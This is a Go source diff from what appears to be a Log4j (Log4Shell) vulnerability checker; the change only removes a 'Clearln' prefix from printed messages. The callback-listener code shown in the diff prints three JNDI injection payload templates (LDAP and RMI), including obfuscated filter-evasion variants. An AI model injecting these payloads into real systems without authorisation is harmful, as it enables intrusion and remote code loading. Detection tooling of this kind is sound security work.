@@ -26,12 +26,12 @@ var Log4jCmd = &cobra.Command{
 		}
 		t := strings.Split(log4listenAddr, ":")
 		if len(t) == 2 {
-			Println(Clearln + "Press ctrl+c to shutdown")
+			Println("Press ctrl+c to shutdown")
 			go Log4jCheckServer(t[0], t[1])
 			c := make(chan os.Signal, 1)
 			signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 			<-c
-			Println(Clearln + "ctrl+c detected. Shutting down")
+			Println("ctrl+c detected. Shutting down")
 		}
 	},
 }
@@ -45,7 +45,7 @@ func Log4j2HandleRequest(conn net.Conn) {
 	buf := make([]byte, 1024)
 	num, err := conn.Read(buf)
 	if err != nil {
-		Println(fmt.Sprintf(Clearln+"accept data reading err %v", err))
+		Println(fmt.Sprintf("accept data reading err %v", err))
 		_ = conn.Close()
 		return
 	}
@@ -88,20 +88,20 @@ func RMI(data []byte) bool {
 func Log4jCheckServer(host string, port string) {
 	listen, err := net.Listen("tcp", fmt.Sprintf("%s:%s", host, port))
 	if err != nil {
-		Println(Clearln + "log4j listen server failed")
+		Println("log4j listen server failed")
 		return
 	}
 	defer listen.Close()
 	//Println()(fmt.Sprintf("[Log4j2] Listen start on %s:%s",host,port))
-	Println(Clearln + "[payload]: ")
-	Println(fmt.Sprintf(Clearln+"==> ${${lower:${lower:jndi}}:${lower:ldap}://%v:%v/poc}", host, port))
-	Println(fmt.Sprintf(Clearln+"==> ${${::-j}ndi:rmi://%v:%v/poc}", host, port))
-	Println(fmt.Sprintf(Clearln+"==> ${jndi:ldap://%v:%v/poc}", host, port))
+	Println("[payload]: ")
+	Println(fmt.Sprintf("==> ${${lower:${lower:jndi}}:${lower:ldap}://%v:%v/poc}", host, port))
+	Println(fmt.Sprintf("==> ${${::-j}ndi:rmi://%v:%v/poc}", host, port))
+	Println(fmt.Sprintf("==> ${jndi:ldap://%v:%v/poc}", host, port))
 	Println("-----------------------------------")
 	for {
 		conn, err := listen.Accept()
 		if err != nil {
-			Println(fmt.Sprintf(Clearln+"accept failed %v", err))
+			Println(fmt.Sprintf("accept failed %v", err))
 			continue
 		}
 		go Log4j2HandleRequest(conn)
